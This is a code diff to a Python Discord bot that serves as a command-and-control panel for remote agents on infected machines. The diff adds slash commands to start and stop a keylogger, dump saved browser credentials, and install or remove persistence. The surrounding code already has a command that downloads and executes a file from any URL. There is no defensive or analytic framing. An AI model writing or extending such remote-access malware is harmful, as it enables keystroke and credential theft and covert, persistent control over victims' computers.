@@ -134,6 +134,26 @@ async def kill_command(interaction: discord.Interaction):
 async def sysinfo_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "sysinfo")
 
+@bot.tree.command(name="keylog_start", description="Start keylogger")
+async def keylog_start_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "keylog_start")
+
+@bot.tree.command(name="keylog_stop", description="Stop keylogger and get logs")
+async def keylog_stop_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "keylog_stop")
+
+@bot.tree.command(name="creds", description="Dump saved browser credentials")
+async def creds_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "creds")
+
+@bot.tree.command(name="persist", description="Install persistence")
+async def persist_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "persist")
+
+@bot.tree.command(name="unpersist", description="Remove persistence")
+async def unpersist_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "unpersist")
+
 @bot.tree.command(name="download_exec", description="Download a file from URL and execute it")
 async def download_exec_command(interaction: discord.Interaction, url: str, args: str = ""):
     cmd = f"downloadexec {url} {args}".strip()
